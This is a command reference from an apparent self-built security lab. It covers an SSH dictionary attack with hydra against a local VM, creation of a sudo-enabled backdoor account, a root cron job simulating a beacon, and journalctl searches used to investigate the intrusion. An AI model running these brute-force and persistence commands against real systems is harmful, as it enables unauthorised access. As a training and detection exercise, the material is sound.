# Command Reference

All commands used throughout this lab, in execution order, with a short description of
what each one does and why. Environment-check commands (used to validate the lab setup,
not part of the attack itself) are marked accordingly.

## Environment Verification

| Command | Description |
|---|---|
| `sudo ufw status verbose` | Check the target's firewall rules — confirms which ports/sources are allowed before attempting any connection |
| `ip addr show` | Confirm the target VM's IP address on the shared network |
| `ifconfig \| grep -B1 "192.168.64"` | Confirm the attacker (Mac) IP on the same shared network |
| `systemctl status fail2ban` | Check whether the target has automated brute-force protection that would interfere with the attack |

## Recon

| Command | Description |
|---|---|
| `nmap -sV -p 22 192.168.64.8` | Scan the target's SSH port and fingerprint the service version (`-sV`) |

## Attack Setup (Target Environment)

| Command | Description |
|---|---|
| `sudo useradd -m testuser` | Create the intentionally vulnerable test account |
| `sudo passwd testuser` | Set a weak, common password (`123456`) on the test account |

## Attack (Attacker Machine)

| Command | Description |
|---|---|
| `cat > wordlist.txt << 'EOF' ... EOF` | Build a small curated password dictionary, including the correct password mixed among decoys |
| `hydra -l testuser -P wordlist.txt -f 192.168.64.8 ssh` | Dictionary brute-force attack against SSH (T1110); `-f` stops at the first valid pair found |

## Persistence (as compromised `testuser`, via SSH)

| Command | Description |
|---|---|
| `ssh testuser@192.168.64.8` | Log in using the credentials recovered by Hydra, simulating the attacker's foothold |
| `sudo usermod -aG sudo testuser` | Grant the compromised account sudo rights — simulates a common real-world overprivileged-account misconfiguration |
| `sudo useradd -m -s /bin/bash sysupdate` | Create a backdoor account independent of the originally compromised credentials (T1136) |
| `sudo passwd sysupdate` | Set the backdoor account's password |
| `echo '* * * * * root echo "beacon: $(date)" >> /var/log/beacon.log' \| sudo tee /etc/cron.d/system-check` | Install a system-wide cron job that runs every minute as root, simulating periodic C2 beacon behavior without real outbound network calls (T1053.003) |

## Target Clock Correction

| Command | Description |
|---|---|
| `date` / `timedatectl` | Check the system clock against the hardware clock (RTC) — found the OS clock ~7 days behind after the VM resumed from a suspended state |
| `sudo hwclock --hctosys` | Sync the system clock from the RTC (which held the correct time) |

## Investigation (SOC Analysis)

| Command | Description |
|---|---|
| `sudo journalctl -u ssh \| grep "Failed password"` | Isolate failed SSH login attempts — the brute-force signature (same user, same source IP, tight time window) |
| `sudo journalctl -u ssh \| grep "Accepted password"` | Find the successful login(s) following the failed attempts |
| `sudo journalctl \| grep -iE "useradd\|usermod\|sysupdate"` | Find evidence of the backdoor account creation and the privilege escalation that enabled it — critically, shows *which account* (`testuser`, not the admin) ran each privileged command |
| `sudo journalctl \| grep -iE "cron.d/system-check\|CRON\[.*root"` | Find both the creation of the cron persistence file and proof it actually fired repeatedly and unattended |

## Notes

- `auth.log` does not exist on this target (modern Ubuntu without `rsyslog` relies on
  `systemd-journald` only) — `journalctl` was used instead of `grep` on a flat file.
- All commands run on the target were executed via SSH from the attacker (Mac) machine,
  except the initial environment setup (`useradd testuser`, `usermod` sudo grant), which
  was run by the legitimate admin account (`ignacio`) to provision the vulnerable
  environment before the simulated attack began.
